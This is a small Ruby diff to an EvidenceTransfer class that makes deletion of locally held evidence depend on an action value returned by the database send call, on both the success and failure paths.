@@ -89,13 +89,14 @@ class EvidenceTransfer
     raise "evidence to be transferred is nil" if evidence.nil?
 
     # send and delete the evidence
-    ret, error = DB.instance.send_evidence(instance, evidence)
+    ret, error, action = DB.instance.send_evidence(instance, evidence)
 
     if ret then
       trace :info, "Evidence sent to db [#{instance}] #{evidence.size.to_s_bytes} - #{left} left to send"
-      EvidenceManager.instance.del_evidence(id, instance)
+      EvidenceManager.instance.del_evidence(id, instance) if action == :delete
     else
       trace :error, "Evidence NOT sent to db [#{instance}]: #{error}"
+      EvidenceManager.instance.del_evidence(id, instance) if action == :delete
     end
     
   end
